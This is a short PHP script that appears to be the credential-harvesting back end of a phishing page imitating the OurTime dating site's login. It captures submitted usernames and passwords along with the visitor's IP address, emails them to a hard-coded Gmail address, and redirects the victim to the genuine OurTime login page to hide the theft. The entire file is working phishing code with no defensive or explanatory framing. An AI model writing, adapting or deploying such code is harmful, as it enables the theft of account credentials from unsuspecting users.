<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ourtime Tare_ama || :------\n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="gregoryweither1406@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com/v3/login?CPSessionID=00000000-0000-0000-0000-000000000000&VisitorID=42049262556");
?>